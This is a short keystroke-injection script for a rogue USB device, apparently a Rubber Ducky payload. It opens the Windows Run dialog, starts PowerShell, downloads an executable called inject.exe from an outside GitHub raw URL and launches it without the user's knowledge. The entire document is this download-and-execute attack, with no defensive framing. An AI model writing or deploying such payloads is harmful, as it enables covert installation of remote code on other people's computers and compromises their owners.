DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 2000
STRING $down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/ar1s3/P0W3R/master/inject.exe'; $file = 'inject.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
ENTER
